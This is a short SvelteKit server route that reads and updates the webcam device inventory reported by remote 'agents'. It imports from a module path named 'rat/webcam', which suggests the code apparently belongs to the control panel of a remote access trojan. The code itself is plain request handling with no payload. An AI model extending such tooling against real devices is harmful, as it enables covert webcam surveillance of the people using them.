import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { webcamControlManager, WebcamControlError } from '$lib/server/rat/webcam';
import type { WebcamDeviceInventory } from '$lib/types/webcam';

export const GET: RequestHandler = ({ params }) => {
	const clientId = params.clientId;
	if (!clientId) {
		throw error(400, 'Missing agent identifier');
	}

	const state = webcamControlManager.getInventoryState(clientId);
	return json(state);
};

export const POST: RequestHandler = async ({ params, request }) => {
	const clientId = params.clientId;
	if (!clientId) {
		throw error(400, 'Missing agent identifier');
	}

	let payload: WebcamDeviceInventory;
	try {
		payload = (await request.json()) as WebcamDeviceInventory;
	} catch {
		throw error(400, 'Invalid webcam inventory payload');
	}

	try {
		webcamControlManager.updateInventory(clientId, payload);
	} catch (err) {
		if (err instanceof WebcamControlError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to update webcam inventory');
	}

	return json({ accepted: true });
};
